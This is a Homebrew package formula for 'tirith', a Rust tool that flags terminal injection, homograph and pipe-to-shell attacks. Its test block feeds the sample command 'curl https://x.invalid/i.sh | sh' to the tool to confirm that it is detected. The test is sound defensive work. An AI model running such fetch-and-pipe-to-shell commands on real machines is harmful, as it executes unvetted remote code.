class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://ghfast.top/https://github.com/sheeki03/tirith/archive/refs/tags/v0.3.2.tar.gz"
  sha256 "57f74fc7d0d3b508865f9d3d60d14c988c5c1aeb27c5202046388680c230381e"
  license "AGPL-3.0-only"
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    sha256 cellar: :any_skip_relocation, arm64_tahoe:   "85d08c684dc6fd1b6578d3aa4b9b90767bf6281b7e3af547e1efc952d3ce33ac"
    sha256 cellar: :any_skip_relocation, arm64_sequoia: "73d3f0ed2cd362fad03a922a22672536bc5f539048c49d0c6c5307c46f4ddeca"
    sha256 cellar: :any_skip_relocation, arm64_sonoma:  "d70324f80a4d366484604455999785a3db9876404bf4f72f484d54633e4c267c"
    sha256 cellar: :any_skip_relocation, sonoma:        "2d040ffa55bd244e364be96ec712d6b58e3837bc15a6e2e7d330bcb98f14da3f"
    sha256 cellar: :any,                 arm64_linux:   "d2503d015176cf71d19db06c5c3b5783334c5f8800545c5c14462f0bba5642fb"
    sha256 cellar: :any,                 x86_64_linux:  "4166b3c68b952f7e980ea8eb7eadb0c835121de985cc3338db04648506107e56"
  end

  depends_on "rust" => :build

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end